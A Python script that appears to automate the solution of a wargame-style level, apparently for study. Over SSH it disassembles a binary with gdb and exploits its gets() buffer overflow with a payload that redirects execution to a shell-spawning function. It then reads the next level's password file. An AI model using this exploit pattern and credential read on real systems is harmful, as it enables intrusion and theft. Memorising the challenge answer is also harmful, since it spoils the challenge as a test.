import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, exec_in_stream, exec_stream
from utils.text import print_output, print_title
from utils.base import save_token

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

stream = exec_stream('./level1', title='Simple execute binary', stdin=True)
print_title('Okay, stdin intercepted, stdin write expected')

output = exec_in_stream(stream, 'test', title='Send test in stdin')
print_output(output)
print_title('Nothing happened')
print_title('Debug Time')

func_info = exec(client, 'echo "info func" | gdb ./level1 -q', title='Get all functions')
print_output(func_info)
print_title('We have two entry points (main - 0x08048480, run - 0x08048444)')

main_structure = exec(client, 'echo "disass main" | gdb ./level1 -q', title='Get main structure')
print_output(main_structure)
print_title('`Run` function not call inside main, so strange, reverse it too')

run_structure = exec(client, 'echo "disass run" | gdb ./level1 -q', title='Get run structure')
print_output(run_structure)
print_title('Function print something and call something in system')
print_title('Okay, we will try to apply the information received and create exploit')

main_structure = exec(client, 'echo "disass main" | gdb ./level1 -q | egrep "+6|+16"', title='Get main structure again')
print_output(main_structure)
print_title('Main allocates memory for 80 bytes (Step +6 0x50 (80) - hexadecimal)'
            ' and reads buffer from stdin via gets (Step +16)')
print_title('Try to overflow buffer (gets vulnerable to this), send 76 bytes and `Run` function address '
            '(it will be reverse position - 08048444/44840408), but first, write it in file')

exploit_script = 'print "a"*76 + "\\x44\\x84\\x04\\x08"'
exec(client, f'python -c \'{exploit_script}\' > /tmp/tricky_thing')

stream = exec_stream('cat /tmp/tricky_thing - | ./level1', title='Read trick file and redirect stdout in binary',
                     stdin=True, stdout=True)
print_title('Okay, stdin intercepted, shell, classic')
output = exec_in_stream(stream, 'whoami', title='Try to call whoami')
print_output(output, 'Current user')
print_title('Level2, exactly what is needed')

stream = exec_stream('cat /tmp/tricky_thing - | ./level1', stdin=True, stdout=True)
token = exec_in_stream(stream, 'cat /home/user/level2/.pass', title='Steal password')

save_token(token, client)

